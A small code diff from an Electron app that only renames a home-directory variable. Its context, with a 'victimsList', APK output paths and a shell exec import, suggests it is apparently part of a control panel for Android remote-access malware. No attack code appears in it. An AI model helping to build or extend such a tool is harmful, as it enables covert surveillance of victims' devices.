@@ -5,12 +5,12 @@ const { ipcRenderer } = require('electron');
 var fs = require('fs-extra')
 var victimsList = remote.require('./main');
 const CONSTANTS = require(__dirname + '/assets/js/Constants')
-var homeDir = require('node-homedir');
+var homedir = require('node-homedir');
 var path = require("path");
 var exec = require('child_process').exec, child;
 //--------------------------------------------------------------
 var viclist = {};
-var dataPath = path.join(homeDir(), CONSTANTS.dataDir);
+var dataPath = path.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
 var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
 //--------------------------------------------------------------
